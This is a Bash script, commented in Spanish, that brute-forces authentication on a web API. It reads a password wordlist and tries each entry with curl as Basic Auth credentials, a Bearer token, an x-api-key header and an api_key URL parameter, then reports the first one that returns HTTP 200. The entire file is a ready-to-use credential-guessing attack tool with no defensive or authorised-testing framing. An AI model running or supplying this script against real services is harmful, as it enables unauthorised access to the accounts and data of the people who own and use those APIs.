#!/bin/bash

# Definir colores para una mejor estética
RED='\033[1;31m'    # Rojo
GREEN='\033[1;32m'  # Verde
YELLOW='\033[1;33m' # Amarillo
BLUE='\033[1;34m'   # Azul
NC='\033[0m'        # Reset color

# Verificar si se proporcionaron los parámetros necesarios
if [ "$#" -lt 2 ]; then
    echo -e "${RED}❌ Uso incorrecto:${NC} $0 <URL_API> <archivo_de_contraseñas.txt>"
    exit 1
fi

URL="$1"
PASSWORD_FILE="$2"

# Verificar si el archivo de contraseñas existe
if [ ! -f "$PASSWORD_FILE" ]; then
    echo -e "${RED}❌ El archivo de contraseñas '$PASSWORD_FILE' no existe.${NC}"
    exit 1
fi

# Mostrar opciones de autenticación al usuario
echo -e "${YELLOW}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━${NC}"
echo -e "${YELLOW}🔐 Selecciona el método de autenticación:${NC}"
echo -e "1) Basic Auth (requiere usuario)"
echo -e "2) Bearer Token"
echo -e "3) API Key en encabezado"
echo -e "4) API Key en la URL"
echo -e "5) 🔄 Probar todos los métodos"
echo -e "${YELLOW}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━${NC}"

read -p "Ingrese la opción (1-5): " OPTION

# Si el usuario elige Basic Auth, solicitar el nombre de usuario
if [ "$OPTION" == "1" ] || [ "$OPTION" == "5" ]; then
    read -p "Ingrese el nombre de usuario para Basic Auth: " USERNAME
fi

# Función para probar Basic Auth
test_basic_auth() {
    echo -e "${YELLOW}[+] Probando Basic Auth con usuario '$USERNAME'${NC}"
    while read -r password; do
        echo -e "${BLUE}[→] Ejecutando:${NC} curl -u '$USERNAME:$password' $URL"
        response=$(curl -s -o /dev/null -w "%{http_code}" -u "$USERNAME:$password" "$URL")
        echo -e "   Respuesta HTTP: ${YELLOW}$response${NC}"

        if [ "$response" == "200" ]; then
            echo -e "${GREEN}[✓] Contraseña encontrada:${NC} $password"
            break
        fi
    done < "$PASSWORD_FILE"
}

# Función para probar Bearer Token
test_bearer_token() {
    echo -e "${YELLOW}[+] Probando Bearer Token${NC}"
    while read -r password; do
        echo -e "${BLUE}[→] Ejecutando:${NC} curl -H 'Authorization: Bearer $password' $URL"
        response=$(curl -s -o /dev/null -w "%{http_code}" -H "Authorization: Bearer $password" "$URL")
        echo -e "   Respuesta HTTP: ${YELLOW}$response${NC}"

        if [ "$response" == "200" ]; then
            echo -e "${GREEN}[✓] Contraseña encontrada:${NC} $password"
            break
        fi
    done < "$PASSWORD_FILE"
}

# Función para probar API Key en el encabezado
test_api_key_header() {
    echo -e "${YELLOW}[+] Probando API Key en encabezado${NC}"
    while read -r password; do
        echo -e "${BLUE}[→] Ejecutando:${NC} curl -H 'x-api-key: $password' $URL"
        response=$(curl -s -o /dev/null -w "%{http_code}" -H "x-api-key: $password" "$URL")
        echo -e "   Respuesta HTTP: ${YELLOW}$response${NC}"

        if [ "$response" == "200" ]; then
            echo -e "${GREEN}[✓] Contraseña encontrada:${NC} $password"
            break
        fi
    done < "$PASSWORD_FILE"
}

# Función para probar API Key en la URL
test_api_key_url() {
    echo -e "${YELLOW}[+] Probando API Key en la URL${NC}"
    while read -r password; do
        echo -e "${BLUE}[→] Ejecutando:${NC} curl '$URL?api_key=$password'"
        response=$(curl -s -o /dev/null -w "%{http_code}" "$URL?api_key=$password")
        echo -e "   Respuesta HTTP: ${YELLOW}$response${NC}"

        if [ "$response" == "200" ]; then
            echo -e "${GREEN}[✓] Contraseña encontrada:${NC} $password"
            break
        fi
    done < "$PASSWORD_FILE"
}

# Ejecutar el método de autenticación elegido
case $OPTION in
    1) test_basic_auth ;;
    2) test_bearer_token ;;
    3) test_api_key_header ;;
    4) test_api_key_url ;;
    5) 
        test_basic_auth
        test_bearer_token
        test_api_key_header
        test_api_key_url
        ;;
    *) echo -e "${RED}❌ Opción inválida${NC}"; exit 1 ;;
esac

echo -e "${YELLOW}✅ Proceso completado.${NC}"
